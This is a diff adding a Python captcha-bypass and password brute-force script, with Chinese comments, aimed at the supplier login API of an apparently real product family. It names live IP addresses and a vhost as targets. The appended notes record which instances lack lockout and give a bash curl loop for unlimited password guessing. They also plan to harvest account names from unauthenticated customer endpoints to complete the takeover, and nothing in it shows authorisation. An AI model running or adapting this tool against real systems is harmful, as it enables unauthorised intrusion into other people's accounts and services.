@@ -1,0 +1,156 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+易售SUP 供货商端 /api/supplier/Login/Verify —— 服务端不校验行为验证码
+适用：易售/易信 SUP 家族 supplier 门户（Go 后端），前端 chunk 里 handleLogin 只判 captchaVerified
+
+判定要点
+  1) captcha / captcha_key 置空串 → 仍进入口令判定
+  2) 整个 captcha 字段省略     → 仍进入口令判定
+  3) 传真实 captcha_key 无票根 → 仍进入口令判定
+  三者响应一致（默认文案「账号或密码错误(若连续错误5次将被禁止登录，需联系管理员于中控端解禁)」）
+  = 行为验证码仅在前端生效，登录口可无验证码爆破。
+
+用法
+  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol --probe
+  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol \
+      --accounts admin,supplier --dict pw.txt --delay 1.2
+
+注意
+  - 必须带 Host 头（SNI 闸按 Host 分流），纯 IP 直连
+  - 自签证书 → verify=False；本机代理 → trust_env=False / 环境无 http_proxy
+  - 服务端每账号 5 次锁定，锁后响应与口令错不可区分，单账号最多 4 发
+  - 但部分 1.0.44 实例（154.12.94.23:8080 / 154.12.94.216:8080 / 43.129.214.240:80）实测完全
+    无失败锁定，此时把下面的 budget 改成全量字典即可
+"""
+import argparse
+import json
+import ssl
+import sys
+import time
+import urllib.request
+
+
+def build_body(account, password, mode):
+    if mode == "empty":
+        return {"account": account, "password": password, "captcha": "", "captcha_key": ""}
+    if mode == "omit":
+        return {"account": account, "password": password}
+    if mode == "fakekey":
+        # 真实格式的雪花 ID，但没有对应票根
+        return {"account": account, "password": password,
+                "captcha": "", "captcha_key": "1793949536802004226"}
+    raise ValueError(mode)
+
+
+def post(url, host, body, timeout=10):
+    data = json.dumps(body).encode()
+    req = urllib.request.Request(url, data=data, method="POST")
+    req.add_header("Host", host)
+    req.add_header("Content-Type", "application/json")
+    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    opener = urllib.request.build_opener(
+        urllib.request.ProxyHandler({}),          # 禁用环境代理
+        urllib.request.HTTPSHandler(context=ctx),
+    )
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--ip", required=True, help="目标 IP，如 154.12.24.246")
+    ap.add_argument("--host", required=True, help="绑定的 vhost，如 supplier.yhj.lol")
+    ap.add_argument("--port", type=int, default=443)
+    ap.add_argument("--scheme", default="https")
+    ap.add_argument("--path", default="/api/supplier/Login/Verify")
+    ap.add_argument("--probe", action="store_true", help="只做三种验证码形态的绕过判定")
+    ap.add_argument("--accounts", default="admin", help="逗号分隔账号")
+    ap.add_argument("--dict", help="口令字典文件，一行一个")
+    ap.add_argument("--delay", type=float, default=1.2, help="请求间隔秒")
+    ap.add_argument("--max-per-account", type=int, default=4,
+                    help="单账号最多发几条（有锁定实例用 4；无锁定实例给 0 = 全量）")
+    ap.add_argument("--banner", default="账号或密码错误", help="口令错时的响应特征子串")
+    a = ap.parse_args()
+
+    url = f"{a.scheme}://{a.ip}:{a.port}{a.path}"
+
+    if a.probe:
+        for mode in ("empty", "omit", "fakekey"):
+            st, txt = post(url, a.host, build_body("admin", "x", mode))
+            print(f"[{mode:8}] HTTP {st} {txt[:200]}")
+            time.sleep(a.delay)
+        print("\n判据：三条都出现口令错误文案 => 验证码未被服务端校验，绕过成立")
+        print("     出现验证码相关文案（请先完成安全验证 / 验证码错误）=> 未绕过")
+        return
+
+    if not a.dict:
+        sys.exit("需要 --dict 或 --probe")
+
+    pwds = [l.strip() for l in open(a.dict, encoding="utf-8", errors="replace") if l.strip()]
+    for acc in [x.strip() for x in a.accounts.split(",") if x.strip()]:
+        budget = pwds if a.max_per_account == 0 else pwds[:a.max_per_account]
+        for pwd in budget:
+            st, txt = post(url, a.host, build_body(acc, pwd, "omit"))
+            hit = a.banner not in txt and '"code":0' in txt.replace(" ", "")
+            print(f"[{'HIT ' if hit else 'miss'}] {acc}:{pwd} HTTP {st} {txt[:160]}")
+            if hit:
+                print("=> 登录成功，拿 data 里的 token 继续")
+                return
+            time.sleep(a.delay)
+        print(f"[info] {acc} 预算已用尽（有锁定实例请保持 ≤4）")
+
+
+if __name__ == "__main__":
+    main()
+
+# ============================================================================
+# 附：实测口径与实例差异（2026-11-06，task#616）
+# ============================================================================
+#
+# 指纹（供货端，无需凭据）：
+#   GET /api/supplier/Login/InitConfig
+#     -> 200 {"code":0,"data":{"icon":"","name":"易信Sup","title":"易信Sup","version":"1.0.44"},"message":"ok"}
+#   GET /api/supplier/Login/Captcha
+#     -> 200 {"code":0,"data":{"captcha_key":"<32hex>","count":3,"expire":900,
+#                              "image_base64":"data:image/png;base64,...","thumb_base64":"..."},"message":"ok"}
+#
+# 判定（POST /api/supplier/Login/Verify，Content-Type: application/json）：
+#   形态 A {"account":"admin","password":"xq9Zz_probe","captcha":"","captcha_key":""}
+#   形态 B {"account":"admin","password":"xq9Zz_probe7","captcha":"zz","captcha_key":"<真实 captcha_key>"}
+#   形态 C {"account":"admin","password":"xq9Zz_nocap"}        # 两个字段都不带
+#   三台实测全部：200 / 56B {"code":1,"data":null,"message":"账号或密码错误"}
+#   —— 无 Set-Cookie、无验证码挑战、无 4xx，说明请求直接落到口令比对分支。
+#
+# 锁定策略按实例不同，必须单独探：
+#   * 154.12.94.23:8080 / 154.12.94.216:8080 / 43.129.214.240:80（1.0.44）：
+#       admin 每台连续 7 次错误口令 → 无 429、无「锁定/禁止登录/解禁/分钟」文案、无 Cookie；
+#       不存在的账号 zzq_nonexist_9x 响应与 admin 逐字节一致 → 无账号枚举 oracle；
+#       ⇒ 验证码闸与失败计数两道防线同时缺失，可任意速率无限爆破。
+#   * 154.12.24.246:443（同族）：验证码同样不校验，但 5 次失败后锁定，
+#       文案「账号或密码错误(若连续错误5次将被禁止登录，需联系管理员于中控端解禁)」，
+#       锁后响应与口令错不可区分 → 单账号预算 ≤4 发，用 --max-per-account 4。
+#
+# 无锁定实例直接跑（bash 版，便于批量）：
+#   for p in $(cat pw.txt); do
+#     curl -sS --noproxy '*' -m 8 -H 'Host: <vhost>.' -H 'Content-Type: application/json' \
+#       --data-binary "{\"account\":\"admin\",\"password\":\"$p\"}" \
+#       http://TARGET:8080/api/supplier/Login/Verify; echo;
+#   done
+#
+# 阴性/失败常见原因：
+#   - Host 不带尾点 → 被 RST 或落到默认站；
+#   - 端口错（供货端 8080 / 有的实例只开 80，443 未必有）；
+#   - 走了本机代理 → Host/SNI 被改写，改 --noproxy '*'；
+#   - 只发一次就下结论（要三形态齐发 + 锁定探测）；
+#   - 把「账号或密码错误」误判成「账号不存在」，从而放弃爆破。
+#
+# 本次口令尝试未命中（admin/yishou/supplier × 站点域派生口令与年份后缀全部 code:1），
+# 说明缺陷成立但真正拿站仍需有效账号名/口令：优先从客户站未授权接口（/api/customer/Home/*）
+# 泄露的供应商名、站点域名、联系人缩写派生账号名，再打该登录面。
